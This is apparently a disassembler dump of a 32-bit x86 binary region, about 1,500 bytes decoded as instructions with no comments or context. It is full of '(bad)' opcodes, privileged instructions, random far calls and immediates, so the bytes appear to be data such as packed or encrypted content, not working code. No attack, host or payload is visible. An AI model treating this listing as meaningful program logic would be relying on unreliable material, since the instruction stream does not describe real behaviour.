  42ad35:	mov    fs:0xadcad20c,eax
  42ad3b:	mov    edi,DWORD PTR [ecx]
  42ad3d:	or     DWORD PTR [ebp+0xca28a38],ebp
  42ad43:	sub    ebp,DWORD PTR [ebp-0x689fef1a]
  42ad49:	fisttp DWORD PTR ds:0xed3d91ac
  42ad4f:	cwde   
  42ad50:	daa    
  42ad51:	add    bl,BYTE PTR [edx]
  42ad53:	push   ecx
  42ad54:	(bad)  
  42ad55:	jb     0x42ad8d
  42ad57:	lock sbb eax,0xa8a2a0a2
  42ad5d:	dec    ebp
  42ad5e:	rcl    DWORD PTR [ebx],1
  42ad60:	push   ebx
  42ad61:	adc    al,0x12
  42ad63:	push   edi
  42ad64:	scas   al,BYTE PTR es:[edi]
  42ad65:	cli    
  42ad66:	loop   0x42ad56
  42ad68:	dec    ebp
  42ad69:	push   esp
  42ad6a:	out    dx,al
  42ad6b:	dec    edi
  42ad6c:	ja     0x42ad62
  42ad6e:	bound  edi,QWORD PTR [edx]
  42ad70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad71:	aam    0xfd
  42ad73:	cmp    DWORD PTR [eax],edi
  42ad75:	aaa    
  42ad76:	call   0x6470:0x4ab2534e
  42ad7d:	pop    ds
  42ad7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad7f:	dec    ecx
  42ad80:	ins    BYTE PTR es:[edi],dx
  42ad81:	add    cl,BYTE PTR [edi]
  42ad83:	(bad)  
  42ad84:	dec    ecx
  42ad85:	add    edx,DWORD PTR [ebp-0x35]
  42ad88:	pop    edx
  42ad89:	or     eax,DWORD PTR [ebx]
  42ad8b:	fs gs xchg edx,esi
  42ad8f:	lock sub bh,BYTE PTR [edx+0x66b7b31d]
  42ad96:	arpl   WORD PTR [eax-0x4d],bp
  42ad99:	push   edi
  42ad9a:	call   0xa52b06bc
  42ad9f:	xchg   edx,eax
  42ada0:	repz sbb al,0x1c
  42ada3:	jecxz  0x42ad4c
  42ada5:	cmp    al,0xa4
  42ada7:	data16 fidiv DWORD PTR [edi+edi*1-0x75054b9f]
  42adaf:	mov    eax,ds:0xace767db
  42adb4:	mov    BYTE PTR [edi+0x6605931],bh
  42adba:	addr16 test eax,0xa579b81e
  42adc0:	cli    
  42adc1:	mov    esp,0x6aa3c1c2
  42adc6:	adc    al,0x90
  42adc8:	dec    ecx
  42adc9:	addr16 (bad) 
  42adcb:	dec    ecx
  42adcc:	movntdq XMMWORD PTR [esi],xmm1
  42add0:	and    esp,DWORD PTR [esi+eiz*8]
  42add3:	or     DWORD PTR [edx-0x3b52c70],ebx
  42add9:	jcxz   0x42adae
  42addc:	sub    edx,esp
  42adde:	repz jb 0x42ae3d
  42ade1:	rcl    BYTE PTR [edi+ecx*2],0xe4
  42ade5:	push   0x5e
  42ade7:	loope  0x42ad8a
  42ade9:	lods   eax,DWORD PTR ds:[esi]
  42adea:	pop    ebp
  42adeb:	pop    ss
  42adec:	test   eax,0xbf0d0658
  42adf1:	mov    BYTE PTR [ecx-0x6328bacc],cl
  42adf7:	outs   dx,DWORD PTR ds:[esi]
  42adf8:	lods   eax,DWORD PTR ds:[esi]
  42adf9:	fild   WORD PTR ds:0xf470c539
  42adff:	and    DWORD PTR [esi+0x55],0xffffffe3
  42ae03:	jo     0x42ae78
  42ae05:	fst    DWORD PTR [edi-0x36]
  42ae08:	or     BYTE PTR [eax],bh
  42ae0a:	daa    
  42ae0b:	frstor [eax]
  42ae0d:	scas   eax,DWORD PTR es:[edi]
  42ae0e:	icebp  
  42ae0f:	mov    dl,0x9f
	...
  42ae71:	add    BYTE PTR [eax],al
  42ae73:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	and    al,0xad
  42ae82:	ret    
  42ae83:	and    eax,0x1cba5
  42ae88:	add    eax,0x20000001
  42ae8d:	and    DWORD PTR [esi-0xefe016a],esi
  42ae93:	push   ecx
  42ae94:	jno    0x42aecf
  42ae96:	in     al,dx
  42ae97:	cld    
  42ae98:	adc    al,0x7c
  42ae9a:	(bad)  
  42ae9b:	fwait
  42ae9c:	inc    esi
  42ae9d:	sbb    BYTE PTR ds:0x91f05d22,0xca
  42aea4:	jmp    0x42aebb
  42aea6:	jp     0x42ae74
  42aea8:	retf   0x3153
  42aeab:	xchg   esi,eax
  42aeac:	push   cs
  42aead:	pop    ebp
  42aeae:	leave  
  42aeaf:	fcomp  st(0)
  42aeb1:	lods   eax,DWORD PTR ds:[esi]
  42aeb2:	jmp    0x42aebe
  42aeb4:	shr    DWORD PTR [ebp-0x45],0x70
  42aeb8:	(bad)  
  42aeba:	or     DWORD PTR [ecx-0x5c],0x543d4bb0
  42aec1:	jae    0x42aeef
  42aec3:	ret    
  42aec4:	jb     0x42ae94
  42aec6:	scas   al,BYTE PTR es:[edi]
  42aec7:	loopne 0x42aed7
  42aec9:	jno    0x42aee1
  42aecb:	and    dl,BYTE PTR [edx-0x6cb3de52]
  42aed1:	or     al,0x18
  42aed3:	mov    DWORD PTR [edx+0x75],edx
  42aed6:	cmp    al,bh
  42aed8:	(bad)  
  42aeda:	xor    DWORD PTR [ecx-0x11],edx
  42aedd:	inc    ebx
  42aede:	jns    0x42ae60
  42aee0:	cli    
  42aee1:	daa    
  42aee2:	push   ds
  42aee3:	outs   dx,DWORD PTR ds:[esi]
  42aee4:	loop   0x42aec1
  42aee6:	ds pop ss
  42aee8:	and    al,BYTE PTR [edi+edi*1-0x1d340664]
  42aeef:	mov    ds:0xe77698c4,al
  42aef4:	pop    ebp
  42aef5:	gs ja  0x42af0a
  42aef8:	mov    ebx,DWORD PTR [edx-0x6e]
  42aefb:	idiv   DWORD PTR [edx+0x3b]
  42aefe:	repnz mov ecx,0xbcf0d5e0
  42af04:	pop    eax
  42af05:	and    BYTE PTR [esi],bl
  42af07:	call   0x72a9:0x987eaad8
  42af0e:	mov    al,ds:0x1d685e77
  42af13:	shr    DWORD PTR [esi+0x7568781f],cl
  42af19:	imul   edx,DWORD PTR [ebx-0x60],0x44
  42af1d:	push   esp
  42af1e:	js     0x42aea4
  42af20:	and    BYTE PTR [ebx],al
  42af22:	dec    eax
  42af23:	test   DWORD PTR [esi+0x5a7f096a],edx
  42af29:	mov    ch,dl
  42af2b:	jmp    0x42af88
  42af2d:	jb     0x42aec6
  42af2f:	pop    eax
  42af30:	sbb    cl,BYTE PTR [esi]
  42af32:	test   BYTE PTR [esi],ah
  42af34:	mov    ds:0xc26e418d,eax
  42af39:	imul   esi,DWORD PTR [edx],0xfffffff5
  42af3c:	dec    ebx
  42af3d:	retf   0xa785
  42af40:	scas   al,BYTE PTR es:[edi]
  42af41:	inc    ebp
  42af42:	xlat   BYTE PTR ds:[ebx]
  42af43:	fidiv  WORD PTR [ebx-0x3406566b]
  42af49:	jns    0x42afb9
  42af4b:	push   ebx
  42af4c:	icebp  
  42af4d:	shl    BYTE PTR [ecx-0x49],cl
  42af50:	cld    
  42af51:	fmul   DWORD PTR [edx+0x1e]
  42af54:	mov    ebx,0xfe626b22
  42af59:	fistp  WORD PTR [edi]
  42af5b:	cmp    dl,ah
  42af5d:	pop    DWORD PTR [ecx-0x565e25ed]
  42af63:	lahf   
  42af64:	inc    edx
  42af65:	(bad)  
  42af66:	rcr    DWORD PTR [ecx],cl
  42af68:	jae    0x42af3f
  42af6a:	sbb    ah,ah
  42af6c:	push   ds
  42af6d:	das    
  42af6e:	add    al,bl
  42af70:	cmp    BYTE PTR [esi],al
  42af72:	push   eax
  42af73:	xchg   edi,eax
  42af74:	xor    eax,0xc721e1fc
  42af79:	inc    esi
  42af7a:	loope  0x42af95
  42af7c:	or     al,0x47
  42af7e:	ret    0xc29a
  42af81:	dec    ecx
  42af82:	sbb    DWORD PTR [edx-0x67],esp
  42af85:	add    eax,0x70da6fac
  42af8a:	xchg   esi,eax
  42af8b:	call   0xc8fc0a78
  42af90:	iret   
	...
  42aff1:	add    BYTE PTR [eax],al
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	lods   al,BYTE PTR ds:[esi]
  42b001:	cmp    al,0x55
  42b003:	loop   0x42afaf
  42b005:	int3   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    eax,0x3c000001
  42b00d:	imul   edi,DWORD PTR [esi+0x1c],0xffffff95
  42b011:	call   0x336:0xc098d290
  42b018:	or     eax,0x186219c7
  42b01d:	mov    edi,0x9677e7ef
  42b022:	jp     0x42afba
  42b024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b025:	add    BYTE PTR [ecx],bh
  42b027:	fidiv  WORD PTR [eax]
  42b029:	rol    DWORD PTR [ebx-0x2d],1
  42b02c:	enter  0x6871,0x24
  42b030:	bswap  ecx
  42b032:	xchg   ebx,eax
  42b033:	loopne 0x42afde
  42b035:	loopne 0x42b053
  42b037:	cmp    al,0x58
  42b039:	scas   eax,DWORD PTR es:[edi]
  42b03a:	add    DWORD PTR [ecx],ebp
  42b03c:	je     0x42b04e
  42b03e:	scas   al,BYTE PTR es:[edi]
  42b03f:	test   BYTE PTR [ebp-0x79],cl
  42b042:	lahf   
  42b043:	sub    eax,0xc12f6524
  42b048:	shr    DWORD PTR [ecx-0x3055c81b],cl
  42b04e:	push   eax
  42b04f:	enter  0x837f,0xe5
  42b053:	aad    0x8f
  42b055:	mov    edi,0x301bc064
  42b05a:	mov    al,ds:0xf12fe84e
  42b05f:	arpl   cx,cx
  42b061:	push   es
  42b062:	adc    esi,DWORD PTR gs:[ebx-0x40]
  42b066:	xor    ebx,ecx
  42b068:	dec    edi
  42b069:	popf   
  42b06a:	mov    bh,bh
  42b06c:	out    dx,eax
  42b06d:	test   BYTE PTR [esi+ebx*4],0x4d
  42b071:	cmc    
  42b072:	mov    cl,0x9c
  42b074:	cmp    eax,edi
  42b076:	mov    cl,0xed
  42b078:	mov    edi,0x48a3e282
  42b07d:	cs cdq 
  42b07f:	int    0x60
  42b081:	into   
  42b082:	js     0x42b0bb
  42b084:	sbb    al,0x47
  42b086:	call   0x9d0a:0xde3791ca
  42b08d:	sbb    al,0xb8
  42b08f:	loope  0x42b0cb
  42b091:	xchg   ecx,eax
  42b092:	inc    esi
  42b093:	stos   DWORD PTR es:[edi],eax
  42b094:	jnp    0x42b0ad
  42b096:	pop    ds
  42b097:	fiadd  WORD PTR [edx-0x24]
  42b09a:	ret    0xf27a
  42b09d:	out    0x37,eax
  42b09f:	scas   eax,DWORD PTR es:[edi]
  42b0a0:	and    BYTE PTR [edi+0x24ba8921],ah
  42b0a6:	push   eax
  42b0a7:	repnz inc edx
  42b0a9:	xor    DWORD PTR [ebx],0x4f
  42b0ac:	mov    bl,0xe2
  42b0ae:	xlat   BYTE PTR ds:[ebx]
  42b0af:	xchg   si,ax
  42b0b1:	xor    bh,BYTE PTR [ebx]
  42b0b3:	sbb    BYTE PTR [edi+0x66],cl
  42b0b6:	aas    
  42b0b7:	(bad)  
  42b0b8:	xchg   esp,eax
  42b0b9:	iret   
  42b0ba:	xor    DWORD PTR [esi+0x2e],ecx
  42b0bd:	push   edx
  42b0be:	enter  0x8d6,0x97
  42b0c2:	sub    DWORD PTR [ebp+0x6d],0x6
  42b0c6:	sti    
  42b0c7:	repz xchg ebx,eax
  42b0c9:	or     bl,BYTE PTR [esi+0x2bb033eb]
  42b0cf:	push   ebx
  42b0d0:	xchg   BYTE PTR [eax-0x5c],dh
  42b0d3:	rol    BYTE PTR [esi+0x72],cl
  42b0d6:	jl     0x42b05e
  42b0d8:	ds loope 0x42b09c
  42b0db:	cld    
  42b0dc:	(bad)  
  42b0dd:	(bad)  
  42b0de:	out    0x15,eax
  42b0e0:	out    0xa3,al
  42b0e2:	and    ebx,DWORD PTR [edx+ecx*2+0x3b58eddc]
  42b0e9:	std    
  42b0ea:	jg     0x42b104
  42b0ec:	hlt    
  42b0ed:	repz xchg ebp,eax
  42b0ef:	test   DWORD PTR [esi+0x1e8f932],ecx
  42b0f5:	mov    eax,ds:0x407eb9c3
  42b0fa:	lods   eax,DWORD PTR ds:[esi]
  42b0fb:	xchg   ecx,eax
  42b0fc:	scas   al,BYTE PTR es:[edi]
  42b0fd:	add    DWORD PTR [ebx-0xb],edi
  42b100:	jp     0x42b121
  42b102:	mov    ch,0x15
  42b104:	leave  
  42b105:	ins    DWORD PTR es:[edi],dx
  42b106:	or     BYTE PTR [edx+0x5e],bh
  42b109:	mov    cl,0xc2
  42b10b:	and    DWORD PTR [eax+0x69d01151],ebx
	...
  42b171:	add    BYTE PTR [eax],al
  42b173:	add    BYTE PTR [ebp+0x25],dh
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	xchg   esp,eax
  42b181:	and    esp,ebx
  42b183:	imul   ebp,DWORD PTR [edi+0x50001cd],0x1
  42b18a:	add    BYTE PTR [eax],al
  42b18c:	call   0xb805:0x1a5d72b8
  42b193:	hlt    
  42b194:	pop    ecx
  42b195:	adc    al,0x9d
  42b197:	cs in  eax,dx
  42b199:	mov    dl,0x8d
  42b19b:	mov    ss,ecx
  42b19d:	ja     0x42b19b
  42b19f:	and    ch,ch
  42b1a1:	cmp    esp,0xffffffc6
  42b1a4:	inc    edx
  42b1a5:	repz jmp 0x5503fcc7
  42b1ab:	mov    ds:0x19c6ae0,al
  42b1b0:	test   eax,0x35f703d0
  42b1b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b1b6:	sti    
  42b1b7:	lods   al,BYTE PTR ds:[esi]
  42b1b8:	mov    ds:0x3f4bfa2a,eax
  42b1bd:	(bad)  
  42b1be:	mov    DWORD PTR [eax+0x74],eax
  42b1c1:	sbb    edx,DWORD PTR [esi-0x2204d35f]
  42b1c7:	xchg   ebx,eax
  42b1c8:	sbb    eax,0x7a45da3f
  42b1cd:	adc    al,bl
  42b1cf:	mov    ebp,0x6f78f31e
  42b1d4:	xchg   BYTE PTR [ebp-0x65],bl
  42b1d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b1d8:	out    dx,al
  42b1d9:	mov    ch,0x76
  42b1db:	mov    eax,ds:0xffdf645
  42b1e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b1e1:	repz sbb al,BYTE PTR [ebx-0x29]
  42b1e5:	push   eax
  42b1e6:	sbb    esp,ebp
  42b1e8:	ds pop ebx
  42b1ea:	sub    DWORD PTR [ecx-0xc48f2f5],esi
  42b1f0:	mov    ds:0x7e651d75,eax
  42b1f5:	dec    esi
  42b1f6:	xor    BYTE PTR [edx+0x7f],0x16
  42b1fa:	pop    edi
  42b1fb:	lock adc al,ch
  42b1fe:	clc    
  42b1ff:	fisttp DWORD PTR [ecx]
  42b201:	shr    BYTE PTR [ebx-0x3e],1
  42b204:	mov    eax,0xe0dba265
  42b209:	and    BYTE PTR [ebp+0x2c],bl
  42b20c:	aam    0x5f
  42b20e:	inc    eax
  42b20f:	jle    0x42b233
  42b211:	pusha  
  42b212:	pop    esp
  42b213:	or     eax,0x5450ed52
  42b218:	(bad)  
  42b219:	daa    
  42b21a:	or     edx,0x3662154c
  42b220:	ret    0xf2cd
  42b223:	ins    DWORD PTR es:[edi],dx
  42b224:	mov    esp,0x2cd86f38
  42b229:	les    esp,FWORD PTR [edx+0x2b]
  42b22c:	push   ss
  42b22d:	sbb    BYTE PTR [esi+0x6a],bl
  42b230:	out    dx,al
  42b231:	call   0xbef0:0x87954af3
  42b238:	jp     0x42b27f
  42b23a:	push   esp
  42b23b:	rcl    ch,cl
  42b23d:	add    BYTE PTR [edx-0x80],cl
  42b240:	mov    esp,0x7fc08cee
  42b245:	mov    ecx,0x4bad404e
  42b24a:	pop    edi
  42b24b:	icebp  
  42b24c:	fisubr DWORD PTR [ebx+ecx*1+0x6b85db70]
  42b253:	stos   BYTE PTR es:[edi],al
  42b254:	dec    ecx
  42b255:	push   esp
  42b256:	test   eax,0x29022ac0
  42b25b:	mov    edi,0x278637b6
  42b260:	icebp  
  42b261:	mov    bh,0x1
  42b263:	mov    edi,0xa575a313
  42b268:	scas   eax,DWORD PTR es:[edi]
  42b269:	mov    ecx,0x780e0087
  42b26e:	addr16 enter 0x98e4,0xfd
  42b273:	cmp    eax,0x73b2a03d
  42b278:	in     eax,0xa2
  42b27a:	stos   BYTE PTR es:[edi],al
  42b27b:	adc    BYTE PTR [edi],bh
  42b27d:	cmp    dl,ch
  42b27f:	popa   
  42b280:	arpl   di,si
  42b282:	jmp    0xe67c5229
  42b287:	xchg   ebp,eax
  42b288:	loope  0x42b2b7
  42b28a:	push   ds
  42b28b:	cmp    DWORD PTR [ebx+0x719516a5],ebp
	...
  42b2f1:	add    BYTE PTR [eax],al
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0x8a738e65
  42b301:	and    al,0xb3
  42b303:	arpl   WORD PTR [esi+ecx*8+0x1050001],si
  42b30a:	add    BYTE PTR [eax],al
  42b30c:	push   ds
  42b30d:	mov    eax,ds:0xa216d666
  42b312:	xor    BYTE PTR [ebx-0x5c33bccb],ah
  42b318:	inc    ebp
  42b319:	daa    
  42b31a:	stc    
  42b31b:	je     0x42b2e2
  42b31d:	out    0x96,eax
  42b31f:	adc    DWORD PTR [eax],esi
  42b321:	dec    edx
  42b322:	enter  0x5ed9,0xa5
  42b326:	mov    ebp,0xda62c038
  42b32b:	nop
  42b32c:	aad    0x9b
  42b32e:	loop   0x42b375
  42b330:	and    DWORD PTR [ecx],ecx
  42b332:	xor    bh,BYTE PTR [edi-0xa]
  42b335:	mov    ecx,cr3
  42b338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b339:	fadd   QWORD PTR [esi+0x77645219]
  42b33f:	scas   eax,DWORD PTR es:[edi]
  42b340:	xor    al,0x4b
  42b342:	push   0x19d50f79
  42b347:	jmp    0x42b3b7
  42b349:	retf   
  42b34a:	sbb    al,BYTE PTR [ebp-0x45]
  42b34d:	fidiv  WORD PTR [eax+0x6e]
  42b350:	adc    DWORD PTR ds:0x69699d5f,0x6c
  42b357:	sbb    dh,BYTE PTR [edx+0x57054da7]
  42b35d:	add    DWORD PTR [ebx+ebp*1],0x19
  42b361:	fwait
  42b362:	xchg   ecx,eax
  42b363:	cmp    ecx,DWORD PTR [esp+esi*4-0x147791d2]
  42b36a:	sbb    al,0x6
  42b36c:	add    bl,BYTE PTR [ebx]
  42b36e:	xchg   ecx,eax
  42b36f:	sbb    al,0xcb
  42b371:	adc    bl,ah
  42b373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b374:	rcl    DWORD PTR [ecx],0x7c
  42b377:	sub    edx,edx
  42b379:	xchg   edx,eax
  42b37a:	and    al,BYTE PTR [ecx-0x724eba3b]
  42b380:	mov    esp,0xb6943bc3
  42b385:	outs   dx,DWORD PTR ds:[esi]
  42b386:	fcmovnb st,st(4)
  42b388:	lods   eax,DWORD PTR ds:[esi]
  42b389:	psraw  mm7,QWORD PTR [esi+ebx*8]
  42b38d:	inc    edx
  42b38e:	push   ss
  42b38f:	adc    ebp,DWORD PTR [esi+0x3d71cdb8]
  42b395:	or     eax,0x82af69bd
  42b39a:	push   ebx
  42b39b:	cwde   
  42b39c:	xchg   DWORD PTR [edx+0x78],ebp
  42b39f:	add    eax,0x5e368360
  42b3a4:	(bad)
  42b3a7:	outs   dx,DWORD PTR ds:[esi]
  42b3a8:	push   0x2da72432
  42b3ad:	pop    ebx
  42b3ae:	add    dh,BYTE PTR [ebp-0x56ccbded]
  42b3b4:	outs   dx,BYTE PTR ds:[esi]
  42b3b5:	cmc    
  42b3b6:	sbb    al,0xad
  42b3b8:	sbb    ecx,eax
  42b3ba:	or     DWORD PTR [esi+0x1f8c7107],ebx
  42b3c0:	push   ds
  42b3c1:	test   esp,edi
  42b3c3:	shl    BYTE PTR [edx],cl
  42b3c5:	push   0xf
  42b3c7:	push   esi
  42b3c8:	cmp    ch,BYTE PTR [edx]
  42b3ca:	cmp    esi,DWORD PTR [eax-0x4a352d40]
  42b3d0:	retf   0x7ff4
  42b3d3:	aam    0x3a
  42b3d5:	sbb    DWORD PTR [ebx+0x41],eax
  42b3d8:	and    DWORD PTR [ebp-0x6e],edx
  42b3db:	jbe    0x42b381
  42b3dd:	dec    ecx
  42b3de:	clc    
  42b3df:	dec    esp
  42b3e0:	stos   BYTE PTR es:[edi],al
  42b3e1:	sbb    eax,0x722c555a
  42b3e6:	and    BYTE PTR [edi+0xe],cl
  42b3e9:	ror    DWORD PTR [ecx-0x3608ff90],1
  42b3ef:	xchg   ebx,eax
  42b3f0:	push   edi
  42b3f1:	mov    bl,0x11
  42b3f3:	add    BYTE PTR [edx+0x12],dl
  42b3f6:	mov    ch,0x7f
  42b3f8:	cmp    BYTE PTR cs:[esi],bl
  42b3fb:	test   ebx,esi
  42b3fd:	cmp    al,0x38
  42b3ff:	jno    0x42b3f7
  42b401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b402:	sub    bl,BYTE PTR [ebx]
  42b404:	xor    esi,DWORD PTR [ebx+ebp*1]
  42b407:	sar    DWORD PTR [edi-0x2f],0x26
  42b40b:	jecxz  0x42b3cc
  42b40d:	jbe    0x42b3cf
  42b40f:	(bad)  
	...
  42b471:	add    BYTE PTR [eax],al
  42b473:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [esi-0x46c71c4e],eax
  42b485:	iret   
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    eax,0x90000001
  42b48d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b48e:	arpl   WORD PTR gs:[edx*2-0x338e6a6f],di
  42b496:	mul    DWORD PTR [edi+ecx*1+0x378afd3c]
  42b49d:	mov    BYTE PTR [ebp+0x4b],dh
  42b4a0:	push   cs
  42b4a1:	and    al,0x5f
  42b4a3:	hlt    
  42b4a4:	into   
  42b4a5:	dec    ebx
  42b4a6:	(bad)  
  42b4a7:	out    0xd8,al
  42b4a9:	das    
  42b4aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b4ab:	push   ecx
  42b4ac:	mov    ch,0x37
  42b4ae:	out    0x81,al
  42b4b0:	enter  0x4a2d,0xa2
  42b4b4:	mov    ebp,0xf197ca92
  42b4b9:	dec    ebp
  42b4ba:	mov    edx,ebx
  42b4bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b4bd:	jecxz  0x42b4fc
  42b4bf:	sbb    ebp,0x54
  42b4c2:	iret   
  42b4c3:	jnp    0x42b464
  42b4c5:	fidiv  DWORD PTR [eax]
  42b4c7:	inc    esp
  42b4c9:	in     eax,dx
  42b4ca:	test   al,0x11
  42b4cc:	sbb    eax,0x91d67bd
  42b4d1:	sbb    eax,0x5f0b6210
  42b4d6:	or     DWORD PTR [esi],ebp
  42b4d8:	pop    edx
  42b4d9:	call   0x8255:0xaf91e998
  42b4e0:	fwait
  42b4e1:	hlt    
  42b4e2:	loope  0x42b493
  42b4e4:	bound  eax,QWORD PTR [edx-0x3778bb79]
  42b4ea:	imul   ebp,DWORD PTR [edi-0x104df6d5],0xcb7eab05
  42b4f4:	retf   
  42b4f5:	sub    DWORD PTR [ecx+0x6fdd0a5f],edx
  42b4fb:	xor    ecx,DWORD PTR [eax-0x32ebe03e]
  42b501:	fst    DWORD PTR [eax-0x4f848082]
  42b507:	gs pop eax
  42b509:	push   ebx
  42b50a:	movaps xmm3,xmm3
  42b50d:	inc    esi
  42b50e:	add    al,0xb8
  42b510:	pop    esp
  42b511:	loope  0x42b555
  42b513:	data16 loope 0x42b4bb
  42b516:	push   edx
  42b517:	push   eax
  42b518:	dec    esp
  42b519:	adc    al,0x75
  42b51b:	sar    bl,cl
  42b51d:	adc    al,0xa9
  42b51f:	std    
  42b520:	jge    0x42b4b9
  42b522:	jmp    0x42b4fd
  42b524:	nop
  42b525:	out    dx,al
  42b526:	dec    esi
  42b527:	out    0x4f,eax
  42b529:	ja     0x42b4ca
  42b52b:	out    dx,al
  42b52c:	fldl2e 
  42b52e:	and    edi,DWORD PTR [eax]
  42b530:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b531:	aas    
  42b532:	repz div DWORD PTR [edx-0x3f]
  42b536:	dec    esp
  42b537:	xor    eax,0x88e832ac
  42b53c:	test   al,0x3f
  42b53e:	jp     0x42b529
  42b540:	jge    0x42b583
  42b542:	js     0x42b56e
  42b544:	fdivr  QWORD PTR [edx]
  42b546:	repz sahf 
  42b548:	push   cs
  42b549:	clc    
  42b54a:	and    DWORD PTR [ecx-0x64cfb51a],0x1515cb1f
  42b554:	add    BYTE PTR [esi+0x1482baa9],cl
  42b55a:	adc    BYTE PTR [eax-0x78711645],ah
  42b560:	sahf   
  42b561:	pop    esi
  42b562:	xchg   ebx,eax
  42b563:	loope  0x42b56f
  42b565:	inc    edi
  42b566:	or     al,0x59
  42b568:	mov    DWORD PTR [ebp-0x1f],0x461f02ee
  42b56f:	push   ecx
  42b570:	xchg   ecx,eax
  42b571:	loopne 0x42b5cf
  42b573:	rcr    BYTE PTR [ebx],0xca
  42b576:	sti    
  42b577:	add    DWORD PTR [ecx-0x64f38b7a],ebx
  42b57d:	call   0x7021:0xd1d3efac
  42b584:	cdq    
  42b585:	sub    bh,ch
  42b587:	mov    edx,0xa521c1f
  42b58c:	dec    ecx
  42b58d:	fbstp  TBYTE PTR [edx-0xf]
  42b590:	int3   
	...
  42b5f1:	add    BYTE PTR [eax],al
  42b5f3:	add    al,ah
  42b5f5:	xchg   esp,eax
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	mov    ecx,0xbe4fc29f
  42b605:	rol    BYTE PTR [ecx],1
  42b607:	add    BYTE PTR ds:0xcb000001,al
  42b60d:	jmp    0xf595:0x6ea06b93
  42b614:	pusha  
  42b615:	mov    dl,0xdc
  42b617:	popf   
  42b618:	add    bl,BYTE PTR [eax+edx*4-0x20]
  42b61c:	ffree  st(4)
  42b61e:	jne    0x42b67d
  42b620:	mov    ds:0xa123570c,al
  42b625:	mov    ebx,0xada6eb8b
  42b62a:	aad    0xc6
  42b62c:	or     al,BYTE PTR [ecx-0x70714b98]
  42b632:	xchg   ebp,eax
  42b633:	sahf   
  42b634:	ret    
  42b635:	fnstenv [ecx+0x3b8493df]
  42b63b:	dec    edx
  42b63c:	es pop ds
  42b63e:	push   ebx
  42b63f:	sbb    edi,DWORD PTR [ebx+0x4c859521]
  42b645:	dec    ebp
  42b646:	pop    edx
  42b647:	ret    0x4e
  42b64a:	push   ecx
  42b64b:	fucomip st,st(6)
  42b64d:	mov    ebx,0xc6733887
  42b652:	inc    esi
  42b653:	test   BYTE PTR [ebp+0x332aa61],dl
  42b659:	inc    ecx
  42b65a:	and    DWORD PTR [ebp+0x1150871e],eax
  42b660:	jb     0x42b632
  42b662:	and    dl,0x2e
  42b665:	das    
  42b666:	fisttp QWORD PTR [esi+0x6fba62aa]
  42b66c:	aad    0x79
  42b66e:	cs clc 
  42b670:	shl    cl,0x77
  42b673:	jge    0x42b667
  42b675:	mov    ds:0x8cadb877,al
  42b67a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b67b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b67c:	or     dl,BYTE PTR [edi+0x25]
  42b67f:	dec    eax
  42b680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b681:	add    DWORD PTR [ecx-0x44],0xecf457f4
  42b688:	xchg   esp,eax
  42b689:	popa   
  42b68a:	push   edi
  42b68b:	mov    ecx,0x47d14aa1
  42b690:	push   es
  42b691:	xchg   esi,eax
  42b692:	fidiv  DWORD PTR [eax-0x32]
  42b695:	or     esp,DWORD PTR ds:0xa03c6df0
  42b69b:	pop    eax
  42b69c:	jbe    0x42b700
  42b69e:	jnp    0x42b653
  42b6a0:	xchg   DWORD PTR [edi+0x1297bdba],edx
  42b6a6:	xor    DWORD PTR [edx+0x5aae3c15],ebp
  42b6ac:	ret    
  42b6ad:	fisttp QWORD PTR [edx+0x5d045007]
  42b6b3:	push   cs
  42b6b4:	(bad)  
  42b6b5:	adc    eax,0x3cac7f76
  42b6ba:	jbe    0x42b6a9
  42b6bc:	mov    edi,0xf6b3b889
  42b6c1:	jl     0x42b733
  42b6c3:	dec    esp
  42b6c4:	call   0xafc05b02
  42b6c9:	scas   eax,DWORD PTR es:[edi]
  42b6ca:	loop   0x42b65a
  42b6cc:	inc    esp
  42b6cd:	sub    BYTE PTR [edx-0x3a78226c],0x57
  42b6d4:	or     al,0x16
  42b6d6:	xor    eax,0x15ef85c4
  42b6db:	or     DWORD PTR [ebp+ebx*1-0x11],ecx
  42b6df:	mov    ds:0xf821bd29,eax
  42b6e4:	mov    ebp,0xf01f321f
  42b6e9:	bound  edi,QWORD PTR [ebx]
  42b6eb:	adc    BYTE PTR [ecx],dl
  42b6ed:	js     0x42b762
  42b6ef:	dec    ebp
  42b6f0:	push   0x4cc53809
  42b6f5:	sbb    eax,0x8d8abae0
  42b6fa:	jmp    0x4e80:0x1e04dba1
  42b701:	xchg   edx,eax
